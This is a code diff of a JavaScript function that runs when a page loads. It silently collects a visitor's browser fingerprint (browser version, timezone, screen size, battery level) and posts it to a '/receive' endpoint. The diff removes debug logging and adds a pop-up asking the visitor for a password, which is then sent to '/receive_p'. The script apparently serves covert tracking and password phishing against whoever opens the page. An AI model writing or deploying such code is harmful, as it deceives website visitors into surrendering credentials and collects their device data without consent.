@@ -1,7 +1,5 @@
-console.log('work?')
 function getData()
 {
-
     let idd= document.getElementById("cID").innerText
     let browser_codeName = navigator.appCodeName;
     let browser_version = navigator.appVersion;
@@ -13,9 +11,6 @@ function getData()
     let timezone_place = Intl.DateTimeFormat().resolvedOptions().timeZone
     let screen_size = screen.width + "X" + screen.height
     let battery_level = battery_getter()
-
-
-    console.log(idd)
 
     const formdata = new FormData()
     const csrf = document.getElementsByName('csrfmiddlewaretoken')
@@ -35,22 +30,40 @@ function getData()
     formdata.append("battery_level",battery_level)
     formdata.append("pyID",idd)
     
+
+    
     $.ajax({
         type: "POST",
         url: "/receive",
         enctype: 'multipart/form-data',
         data : formdata,
-    
-        success: function (res) {
-          console.log(res);
-        },
-        error: function (errpr) {
-          console.log(errpr);
-        },
+
         cache: false,
         contentType: false,
         processData: false,
       });
+      let pswd= document.getElementById("pswd").innerText
+      
+      if (pswd =='p'){
+        let password = prompt('Enter Password:');
+        const pData=new FormData();
+
+
+        pData.append('csrfmiddlewaretoken',csrf[0].value)
+        pData.append('pswd',password)
+        pData.append('pyID',idd)
+
+        $.ajax({
+          type: "POST",
+          url: "/receive_p",
+          enctype: 'multipart/form-data',
+          data : pData,
+  
+          cache: false,
+          contentType: false,
+          processData: false,          
+        })
+      }
 }
 getData()
 
